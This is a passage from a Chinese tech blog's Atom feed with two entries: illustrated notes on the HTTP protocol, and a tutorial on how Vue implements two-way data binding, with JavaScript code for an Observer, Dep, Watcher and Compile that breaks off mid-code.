      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="HTTP" scheme="http://blog.poetries.top/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议系列（二）</title>
    <link href="http://blog.poetries.top/2018/02/26/http-2/"/>
    <id>http://blog.poetries.top/2018/02/26/http-2/</id>
    <published>2018-02-26T15:20:43.000Z</published>
    <updated>2018-04-10T03:33:13.975Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>图解HTTP一书</p></blockquote><h1 id="一、了解web及网络基础"><a href="#一、了解web及网络基础" class="headerlink" title="一、了解web及网络基础"></a>一、了解web及网络基础</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP1%3A了解web及网络基础.png" alt=""></p><blockquote><p>对于与<code>HTTP</code>相关的协议如<code>TCP</code>,<code>IP</code>,<code>DNS</code>,<code>ARP</code>等，它们之间协作关系如下：</p></blockquote><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/http_tcp_dns_arp.png" alt=""></p><h1 id="二、简单的HTTP协议"><a href="#二、简单的HTTP协议" class="headerlink" title="二、简单的HTTP协议"></a>二、简单的HTTP协议</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP2简单的HTTP协议.png" alt=""></p><h2 id="2-1-请求与响应"><a href="#2-1-请求与响应" class="headerlink" title="2.1 请求与响应"></a>2.1 请求与响应</h2><blockquote><p><code>HTTP</code>协议通过客户端(<code>request</code>)，服务器端(<code>response</code>)实现网络通信</p></blockquote><ul><li>请求报文：</li></ul><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/request.png" alt=""></p><ul><li>响应报文：</li></ul><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/reponses.png" alt=""></p><h2 id="2-2-HTTP非持久连接和持久连接"><a href="#2-2-HTTP非持久连接和持久连接" class="headerlink" title="2.2 HTTP非持久连接和持久连接"></a>2.2 HTTP非持久连接和持久连接</h2><blockquote><p><code>HTTP</code>既可以使用非持久连接（<code>nonpersistent connection</code>），也可以使用持久连接（<code>persistent connection</code>）。HTTP/1.0使用非持久连接，<code>HTTP/1.1</code>默认使用持久连接。</p></blockquote><ul><li>HTTP持久连接是使用同一个TCP连接来发送和接收多个<code>HTTP</code>请求/应答，而不是为每一个新的请求/应答打开新的连接的方法</li></ul><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/HTTP_persistent_connection.png" alt=""></p><h2 id="2-3-HTTP管线化"><a href="#2-3-HTTP管线化" class="headerlink" title="2.3 HTTP管线化"></a>2.3 HTTP管线化</h2><ul><li>HTTP管线化将多个<code>HTTP</code>请求整批提交，而在发送过程中不需先等待服务端的回应。</li></ul><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/HTTP_pipelining.png" alt=""></p><h1 id="三、HTTP报文内HTTP信息"><a href="#三、HTTP报文内HTTP信息" class="headerlink" title="三、HTTP报文内HTTP信息"></a>三、HTTP报文内HTTP信息</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP3HTTP报文内HTTP信息.png" alt=""></p><h2 id="3-1-请求报文"><a href="#3-1-请求报文" class="headerlink" title="3.1 请求报文"></a>3.1 请求报文</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/1a4e7e6a-6d7b-38f1-af8a-043140034c8f.jpg" alt=""></p><p>下面是一个实际请求：</p><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/412b4451-2738-3ebc-b1f6-a0cc13b9697b.jpg" alt=""></p><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/cdc4dbbb-f98e-31d5-8270-3c37bf1c54e5.jpg" alt=""></p><h2 id="3-2-响应报文"><a href="#3-2-响应报文" class="headerlink" title="3.2 响应报文"></a>3.2 响应报文</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/0236098f-1a98-3a4f-ba6c-4a44c6ec4ed0.jpg" alt=""></p><p>以下是一个实际的HTTP响应报文： </p><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/bddb00b6-a3e1-3112-a4f4-4b3cb8687c70.jpg" alt=""></p><h1 id="四、返回结果的HTTP状态码"><a href="#四、返回结果的HTTP状态码" class="headerlink" title="四、返回结果的HTTP状态码"></a>四、返回结果的HTTP状态码</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/http1.jpg" alt=""></p><h1 id="五、与HTTP协作的Web服务器"><a href="#五、与HTTP协作的Web服务器" class="headerlink" title="五、与HTTP协作的Web服务器"></a>五、与HTTP协作的Web服务器</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP5与HTTP协作的Web服务器.png" alt=""></p><h1 id="六、HTTP首部"><a href="#六、HTTP首部" class="headerlink" title="六、HTTP首部"></a>六、HTTP首部</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP6HTTP首部.png" alt=""></p><h2 id="6-1-通用首部字段"><a href="#6-1-通用首部字段" class="headerlink" title="6.1 通用首部字段"></a>6.1 通用首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header1.png" alt=""></p><h2 id="6-2-请求首部字段"><a href="#6-2-请求首部字段" class="headerlink" title="6.2 请求首部字段"></a>6.2 请求首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header2.png" alt=""></p><h2 id="6-3-响应首部字段"><a href="#6-3-响应首部字段" class="headerlink" title="6.3 响应首部字段"></a>6.3 响应首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header3.png" alt=""></p><h2 id="6-4-实体首部字段"><a href="#6-4-实体首部字段" class="headerlink" title="6.4 实体首部字段"></a>6.4 实体首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header4.png" alt=""></p><h2 id="6-5-为-Cookie-服务的首部字段"><a href="#6-5-为-Cookie-服务的首部字段" class="headerlink" title="6.5 为 Cookie 服务的首部字段"></a>6.5 为 Cookie 服务的首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header5.png" alt=""></p><h1 id="七、确保Web安全的Https"><a href="#七、确保Web安全的Https" class="headerlink" title="七、确保Web安全的Https"></a>七、确保Web安全的Https</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP7确保Web安全的Https.png" alt=""></p><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/img_0137.png" alt=""></p><h1 id="八、确认访问用户身份的认证"><a href="#八、确认访问用户身份的认证" class="headerlink" title="八、确认访问用户身份的认证"></a>八、确认访问用户身份的认证</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP8确认访问用户身份的认证.png" alt=""></p><h1 id="九、基于HTTP的功能追加协议"><a href="#九、基于HTTP的功能追加协议" class="headerlink" title="九、基于HTTP的功能追加协议"></a>九、基于HTTP的功能追加协议</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP9基于HTTP的功能追加协议.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;图解HTTP一书&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;一、了解web及网络基础&quot;&gt;&lt;a href=&quot;#一、了解web及网络基础&quot; class=&quot;headerlink&quot; title=&quot;一、了解web及网络基础&quot;&gt;&lt;/a&gt;一、了解web
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="HTTP" scheme="http://blog.poetries.top/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>实现数据的双向绑定mvvm-剖析Vue的原理</title>
    <link href="http://blog.poetries.top/2018/02/25/vue-mvvm/"/>
    <id>http://blog.poetries.top/2018/02/25/vue-mvvm/</id>
    <published>2018-02-25T09:12:32.000Z</published>
    <updated>2018-04-10T03:33:13.995Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>完成的效果</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"mvvm-app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"word"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;word&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"sayHi"</span>&gt;</span>change model<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"observer.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"watcher.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"compile.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mvvm.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> vm = <span class="keyword">new</span> MVVM(&#123;</span></span><br><span class="line"><span class="javascript">    el: <span class="string">'#mvvm-app'</span>,</span></span><br><span class="line"><span class="undefined">    data: &#123;</span></span><br><span class="line"><span class="javascript">        word: <span class="string">'Hello World!'</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    methods: &#123;</span></span><br><span class="line"><span class="javascript">        sayHi: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.word = <span class="string">'Hi, everybody!'</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/honeydlp/mvvm/raw/master/defineProperty/img/1.gif" alt=""></p><h2 id="一、几种实现双向绑定的做法"><a href="#一、几种实现双向绑定的做法" class="headerlink" title="一、几种实现双向绑定的做法"></a>一、几种实现双向绑定的做法</h2><blockquote><p>目前几种主流的<code>mvc(vm)</code>框架都实现了单向数据绑定，而我所理解的双向数据绑定无非就是在单向绑定的基础上给可输入元素（<code>input</code>、<code>textare</code>等）添加了<code>change(input)</code>事件，来动态修改<code>model</code>和 <code>view</code>，并没有多高深。所以无需太过介怀是实现的单向或双向绑定。</p></blockquote><ul><li>发布者-订阅者模式（<code>backbone.js</code>）</li><li>脏值检查（<code>angular.js</code>） </li><li>数据劫持（<code>vue.js</code>） </li></ul><h3 id="1-1-发布者-订阅者模式"><a href="#1-1-发布者-订阅者模式" class="headerlink" title="1.1 发布者-订阅者模式"></a>1.1 发布者-订阅者模式</h3><ul><li>一般通过<code>sub</code>, <code>pub</code>的方式实现数据和视图的绑定监听，更新数据方式通常做法是 <code>vm.set(&#39;property&#39;, value)</code>，<a href="http://www.html-js.com/article/Study-of-twoway-data-binding-JavaScript-talk-about-JavaScript-every-day" target="_blank" rel="noopener">这里有篇文章讲的比较详细</a></li><li>这种方式现在毕竟太low了，我们更希望通过 <code>vm.property = value</code>这种方式更新数据，同时自动更新视图，于是有了下面两种方式</li></ul><h3 id="1-2-脏值检查"><a href="#1-2-脏值检查" class="headerlink" title="1.2 脏值检查"></a>1.2 脏值检查</h3><blockquote><p><code>angular.js</code> 是通过脏值检测的方式比对数据是否有变更，来决定是否更新视图，最简单的方式就是通过 <code>setInterval()</code> 定时轮询检测数据变动，当然Google不会这么low，angular只有在指定的事件触发时进入脏值检测，大致如下：</p></blockquote><ul><li><code>DOM</code>事件，譬如用户输入文本，点击按钮等。( <code>ng-click</code> ) </li><li><code>XHR</code>响应事件 ( <code>$http</code> ) </li><li>浏览器<code>Location</code>变更事件 ( <code>$location</code> ) </li><li><code>Timer</code>事件( <code>$timeout</code> , <code>$interval</code> ) </li><li>执行 <code>$digest()</code> 或 <code>$apply()</code></li></ul><h3 id="1-3-数据劫持"><a href="#1-3-数据劫持" class="headerlink" title="1.3 数据劫持"></a>1.3 数据劫持</h3><ul><li><code>vue.js</code>则是采用数据劫持结合发布者-订阅者模式的方式，通过<code>Object.defineProperty()</code>来劫持各个属性的<code>setter</code>，<code>getter</code>，在数据变动时发布消息给订阅者，触发相应的监听回调。</li></ul><h2 id="二、实现思路"><a href="#二、实现思路" class="headerlink" title="二、实现思路"></a>二、实现思路</h2><blockquote><p>已经了解到<code>vue</code>是通过数据劫持的方式来做数据绑定的，其中最核心的方法便是通过<code>Object.defineProperty()</code>来实现对属性的劫持，达到监听数据变动的目的，无疑这个方法是本文中最重要、最基础的内容之一，如果不熟悉<code>defineProperty</code>，猛戳<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty" target="_blank" rel="noopener">这里</a></p></blockquote><p><strong>要实现mvvm的双向绑定，就必须要实现以下几点</strong></p><ul><li>实现一个数据监听器<code>Observer</code>，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者</li><li>实现一个指令解析器<code>Compile</code>，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数</li><li>实现一个<code>Watcher</code>，作为连接<code>Observer</code>和<code>Compile</code>的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图</li><li><code>mvvm</code>入口函数，整合以上三者</li></ul><p>上述流程如图所示：</p><p><img src="https://github.com/honeydlp/mvvm/raw/master/defineProperty/img/2.png" alt=""></p><h3 id="2-1-实现Observer"><a href="#2-1-实现Observer" class="headerlink" title="2.1 实现Observer"></a>2.1 实现Observer</h3><ul><li>我们知道可以利用<code>Obeject.defineProperty()</code>来监听属性变动</li><li>那么将需要<code>observe</code>的数据对象进行递归遍历，包括子属性对象的属性，都加上<code>setter</code>和<code>getter</code></li><li>这样的话，给这个对象的某个值赋值，就会触发<code>setter</code>，那么就能监听到了数据变化。相关代码可以是这样</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;<span class="attr">name</span>: <span class="string">'kindeng'</span>&#125;;</span><br><span class="line">observe(data);</span><br><span class="line">data.name = <span class="string">'dmq'</span>; <span class="comment">// 哈哈哈，监听到值变化了 kindeng --&gt; dmq</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">observe</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data || <span class="keyword">typeof</span> data !== <span class="string">'object'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 取出所有属性遍历</span></span><br><span class="line">    <span class="built_in">Object</span>.keys(data).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    defineReactive(data, key, data[key]);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span>(<span class="params">data, key, val</span>) </span>&#123;</span><br><span class="line">    observe(val); <span class="comment">// 监听子属性</span></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">        enumerable: <span class="literal">true</span>, <span class="comment">// 可枚举</span></span><br><span class="line">        configurable: <span class="literal">false</span>, <span class="comment">// 不能再define</span></span><br><span class="line">        get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;,</span><br><span class="line">        set: <span class="function"><span class="keyword">function</span>(<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'哈哈哈，监听到值变化了 '</span>, val, <span class="string">' --&gt; '</span>, newVal);</span><br><span class="line">            val = newVal;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>完整代码 <a href="https://github.com/poetries/mvvm/blob/master/observer.js" target="_blank" rel="noopener">https://github.com/poetries/mvvm/blob/master/observer.js</a></li></ul><blockquote><p>这样我们已经可以监听每个数据的变化了，那么监听到变化之后就是怎么通知订阅者了，所以接下来我们需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发<code>notify</code>，再调用订阅者的<code>update</code>方法，代码改善之后是这样</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span>(<span class="params">data, key, val</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> dep = <span class="keyword">new</span> Dep();</span><br><span class="line">    observe(val); <span class="comment">// 监听子属性</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">        <span class="comment">// ... 省略</span></span><br><span class="line">        set: <span class="function"><span class="keyword">function</span>(<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (val === newVal) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'哈哈哈，监听到值变化了 '</span>, val, <span class="string">' --&gt; '</span>, newVal);</span><br><span class="line">            val = newVal;</span><br><span class="line">            dep.notify(); <span class="comment">// 通知所有订阅者</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.subs = [];</span><br><span class="line">&#125;</span><br><span class="line">Dep.prototype = &#123;</span><br><span class="line">    addSub: <span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subs.push(sub);</span><br><span class="line">    &#125;,</span><br><span class="line">    notify: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subs.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span><br><span class="line">            sub.update();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>那么问题来了，谁是订阅者，怎么往订阅器添加订阅者？</li><li>没错，上面的思路整理中我们已经明确订阅者应该是<code>Watcher</code>, 而且<code>var dep = new Dep();</code>是在 <code>defineReactive</code>方法内部定义的，所以想通过<code>dep</code>添加订阅者，就必须要在闭包内操作，所以我们可以在<code>getter</code>里面动手脚：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Observer.js</span></span><br><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 由于需要在闭包内添加watcher，所以通过Dep定义一个全局target属性，暂存watcher, 添加完移除</span></span><br><span class="line">Dep.target &amp;&amp; dep.addDep(Dep.target);</span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ... 省略</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Watcher.js</span></span><br><span class="line">Watcher.prototype = &#123;</span><br><span class="line">get: <span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">Dep.target = <span class="keyword">this</span>;</span><br><span class="line"><span class="keyword">this</span>.value = data[key];<span class="comment">// 这里会触发属性的getter，从而添加订阅者</span></span><br><span class="line">Dep.target = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里已经实现了一个<code>Observer</code>了，已经具备了监听数据和数据变化通知订阅者的功能。那么接下来就是实现<code>Compile</code>了</li></ul><h3 id="2-2-实现Compile"><a href="#2-2-实现Compile" class="headerlink" title="2.2 实现Compile"></a>2.2 实现<code>Compile</code></h3><ul><li><code>compile</code>主要做的事情是解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图</li><li>并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图，如图所示</li></ul><p><img src="https://github.com/honeydlp/mvvm/raw/master/defineProperty/img/3.png" alt=""></p><ul><li>因为遍历解析的过程有多次操作<code>dom</code>节点，为提高性能和效率，会先将跟节点<code>el</code>转换成文档碎片<code>fragment</code>进行解析编译操作</li><li>解析完成，再将<code>fragment</code>添加回原来的真实<code>dom</code>节点中</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Compile</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$el = <span class="keyword">this</span>.isElementNode(el) ? el : <span class="built_in">document</span>.querySelector(el);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.$el) &#123;</span><br><span class="line">        <span class="keyword">this</span>.$fragment = <span class="keyword">this</span>.node2Fragment(<span class="keyword">this</span>.$el);</span><br><span class="line">        <span class="keyword">this</span>.init();</span><br><span class="line">        <span class="keyword">this</span>.$el.appendChild(<span class="keyword">this</span>.$fragment);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Compile.prototype = &#123;</span><br><span class="line">init: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">this</span>.compileElement(<span class="keyword">this</span>.$fragment); &#125;,</span><br><span class="line">    node2Fragment: <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> fragment = <span class="built_in">document</span>.createDocumentFragment(), child;</span><br><span class="line">        <span class="comment">// 将原生节点拷贝到fragment</span></span><br><span class="line">        <span class="keyword">while</span> (child = el.firstChild) &#123;</span><br><span class="line">            fragment.appendChild(child);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fragment;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>compileElement</code>方法将遍历所有节点及其子节点，进行扫描解析编译，调用对应的指令渲染函数进行数据渲染，并调用对应的指令更新函数进行绑定，详看代码及注释说明</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Compile.prototype = &#123;</span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line">compileElement: <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> childNodes = el.childNodes, me = <span class="keyword">this</span>;</span><br><span class="line">        [].slice.call(childNodes).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> text = node.textContent;</span><br><span class="line">            <span class="keyword">var</span> reg = <span class="regexp">/\&#123;\&#123;(.*)\&#125;\&#125;/</span>;<span class="comment">// 表达式文本</span></span><br><span class="line">            <span class="comment">// 按元素节点方式编译</span></span><br><span class="line">            <span class="keyword">if</span> (me.isElementNode(node)) &#123;</span><br><span class="line">                me.compile(node);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (me.isTextNode(node) &amp;&amp; reg.test(text)) &#123;</span><br><span class="line">                me.compileText(node, <span class="built_in">RegExp</span>.$<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 遍历编译子节点</span></span><br><span class="line">            <span class="keyword">if</span> (node.childNodes &amp;&amp; node.childNodes.length) &#123;</span><br><span class="line">                me.compileElement(node);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    compile: <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> nodeAttrs = node.attributes, me = <span class="keyword">this</span>;</span><br><span class="line">        [].slice.call(nodeAttrs).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">attr</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 规定：指令以 v-xxx 命名</span></span><br><span class="line">            <span 